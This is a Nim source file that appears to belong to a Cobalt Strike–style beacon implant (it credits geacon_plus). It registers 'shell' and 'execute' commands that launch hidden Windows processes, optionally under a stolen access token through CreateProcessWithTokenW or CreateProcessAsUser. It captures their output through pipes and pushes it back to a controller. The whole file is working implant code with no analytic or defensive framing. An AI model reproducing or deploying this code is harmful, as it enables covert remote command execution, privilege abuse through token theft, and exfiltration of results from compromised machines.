import ../../[utils]
import ../[types, result]
import winim
import winim/[lean, winstr]
import std/[strutils, os, strformat, sequtils]
import token

proc create_process*(app, args: var string, use_pipe_output, use_token, suspend: bool): PROCESS_INFORMATION
proc loop_read*(handle, pipe: HANDLE, callback: callback_type)

proc shell(buf: var seq[byte], cmd: command_type) =
    ## from geacon_plus
    # third params is Wow64DisableWow64FsRedirection, used for 32bit wow64 program to access native system32 folder,
    # but I have changed the system32 dir manually, so it is ignored
    var args = parse_multiple(buf, 2)
    var app = args[0].toString
    var appDst: array[MAX_PATH, WCHAR]
    var arg = args[1].toString
    removePrefix(arg, " ")
    removeSuffix(arg, " ")
    if ExpandEnvironmentStringsW(+$app, &appDst[0], MAX_PATH) == 0:
        dbg fmt"[-] Expanded argument failed: {GetLastError()}"
    if arg.startsWith("/C"): arg[1] = 'c'

    # set openArrayStringable is necessary, see winim/winstr doc
    setOpenArrayStringable(true)
    defer: setOpenArrayStringable(false)
    app = $appDst
    var pi = create_process(app, arg, true, true, false)
    if pi.hProcess == 0:
        dbg "[-] CreateProcess failed: " & $GetLastError()
        return
    CloseHandle(pi.hProcess)
    CloseHandle(pi.hThread)

proc exec(buf: var seq[byte], cmd: command_type) =
    var app = ""
    var arg = buf.toString
    var pi = create_process(app, arg, false, true, false)
    if pi.hProcess == 0:
        dbg "[-] CreateProcess failed: " & $GetLastError()
        return
    CloseHandle(pi.hProcess)
    CloseHandle(pi.hThread)

proc create_process*(app, args: var string, use_pipe_output, use_token, suspend: bool): PROCESS_INFORMATION =
    var appStr, argsStr: LPWSTR
    if app != "": appStr = winstrConverterStringToLPWSTR(app)
    else: appStr = nil
    if args != "": argsStr = winstrConverterStringToLPWSTR(args)
    else: argsStr = nil
    
    var si: STARTUPINFO
    var pi: PROCESS_INFORMATION
    var hWPipe, hRPipe: HANDLE

    si.wShowWindow = 0
    var creationFlag = 0x08000000.DWORD # CREATE_NO_WINDOW
    if suspend: creationFlag = creationFlag or 0x00000004.DWORD # CREATE_SUSPENDED
    var inheritHandle = 1.WINBOOL

    if use_pipe_output:
        var saPipe: SECURITY_ATTRIBUTES
        saPipe.nLength = sizeof(SECURITY_ATTRIBUTES).DWORD
        saPipe.lpSecurityDescriptor = nil
        saPipe.bInheritHandle = 1.WINBOOL

        if CreatePipe(&hRPipe, &hWPipe, &saPipe, 0) == 0:
            dbg "[-] CreatePipe error: " & $GetLastError()
            return

        si.dwFlags = STARTF_USESTDHANDLES
        si.hStdOutput = hWPipe
        si.hStdError = hWPipe

    if use_token and token_valid:
        if CreateProcessWithTokenW(stolen_token, LOGON_WITH_PROFILE, appStr, argsStr, creationFlag, nil, nil, &si, &pi) == 0:
            dbg "[-] CreateProcessWithTokenW error: " & $GetLastError()
            if CreateProcessAsUser(stolen_token, appStr, argsStr, nil, nil, inheritHandle, creationFlag, nil, nil, &si, &pi) == 0:
                dbg "[-] CreateProcessAsUser error: " & $GetLastError()
                return
    else:
        if CreateProcess(appStr, argsStr, nil, nil, inheritHandle, creationFlag, nil, nil, &si, &pi) == 0:
            dbg fmt"[-] CreateProcess error: {GetLastError()}, appstr:{appStr}, argsstr:{argsStr}"
            return

    dbg fmt"[+] Process created, PID: {pi.dwProcessId}"
    if use_pipe_output:
        dbg "[*] Reading output from pipe..."
        loop_read(pi.hProcess, hRPipe, CALLBACK_OUTPUT)
    
    defer:
        dbg "[*] Closing handles..."
        CloseHandle(hWPipe)
        CloseHandle(hRPipe) 
        return pi
        
proc loop_read*(handle, pipe: HANDLE, callback: callback_type) =
    var buf: seq[byte]
    var count = 0
    var exited = false
    var pipe_buf: array[1024, char]
    var bytesAvail, bytesRead: DWORD

    while true:
        if WaitForSingleObject(handle, 0) == WAIT_OBJECT_0:
            dbg "[*] Handle alerted"
            exited = true

        if PeekNamedPipe(pipe, nil, 0, nil, &bytesAvail, nil) == 0:
            dbg "[-] PeekNamedPipe error: " & $GetLastError()
            return

        if bytesAvail == 0:
            if not exited:
                dbg "[-] No data available in the pipe, wait"
                sleep(1000)
                continue
            else:
                sleep(20000) # wait for output available?
                if PeekNamedPipe(pipe, nil, 0, nil, &bytesAvail, nil) == 0:
                    dbg "[-] PeekNamedPipe error: " & $GetLastError()
                    return
                if bytesAvail == 0:
                    dbg "[-] No data available in the pipe, exit"
                    break

        dbg "[*] Reading " & $bytesAvail & " bytes from the pipe..."          
        count += 1
        if ReadFile(pipe, &pipe_buf[0], sizeof(pipe_buf).DWORD, &bytesRead, nil) == 0:
            var err = GetLastError()
            if err != 233: # ERROR_PIPE_DISCONNECTED
                dbg "[-] ReadFile error: " & $GetLastError()
            return
        for p in pipe_buf[0..bytesRead-1]: buf.add(p.byte)
        dbg "[*] Read from pipe: " & buf.toString
        
        # if callback is screenshot, send the buf in one time, otherwise send it separately
        if callback != CALLBACK_SCREENSHOT:
            push_result(callback, buf)
            buf.delete(0..<buf.len)

    if callback != CALLBACK_SCREENSHOT:
        if count >= 2:
            push_result(callback, "---------output end---------".toSeq)
    else:
        push_result(callback, buf[4..<buf.len])

register_command(CMD_TYPE_SHELL, shell)
register_command(CMD_TYPE_EXECUTE, exec)

